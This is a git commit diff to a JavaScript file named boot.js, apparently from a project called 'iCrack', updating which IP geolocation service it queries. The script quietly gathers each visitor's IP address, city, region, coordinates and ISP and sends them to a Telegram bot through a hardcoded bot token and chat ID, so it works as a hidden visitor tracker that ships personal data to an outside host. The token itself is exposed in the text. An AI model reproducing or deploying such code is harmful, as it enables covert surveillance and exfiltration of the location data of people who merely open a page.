fddeeb2ff67eabfe06f165bb92a633608bd20bf4
isumitfx <63400226+isumitfx@users.noreply.github.com>
2021-08-24 23:22:39 +0530

    Update boot.js

--- js/boot.js
+++ js/boot.js
@@ -3,11 +3,11 @@ TOKEN: "1990494557:AAEZjIWrL9in7xgBxC_XMo_BFrJJ1q5Cgrc",
 chatID: "-1001590122992",
 }
 
-const api_url = 'http://ip-api.com/json/?fields=country,regionName,city,zip,lat,lon,timezone,isp,query'
+const api_url = 'https://ipwhois.app/json/?objects=ip,country,region,city,latitude,longitude,org,isp,timezone'
 async function getISS() {
 	const response = await fetch(api_url);
 	const data = await response.json();
-	var my_text = `iCrack:%0A - IP Address: ${data.query} %0A - City: ${data.city} %0A - State: ${data.regionName} %0A - ZIP: ${data.zip} %0A - Country: ${data.country} %0A - Time Zone: ${data.timezone} %0A - Latitude: ${data.lat} %0A - Longitude: ${data.lon} %0A - ISP: ${data.isp}`
+	var my_text = `iCrack:%0A - IP Address: ${data.ip} %0A - City: ${data.city} %0A - State: ${data.region} %0A - Country: ${data.country} %0A - Time Zone: ${data.timezone} %0A - Latitude: ${data.latitude} %0A - Longitude: ${data.longitude} %0A - Internet Service Provider: ${data.isp} %0A - Organization: ${data.isp}`
 
 	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
 	method: "GET"
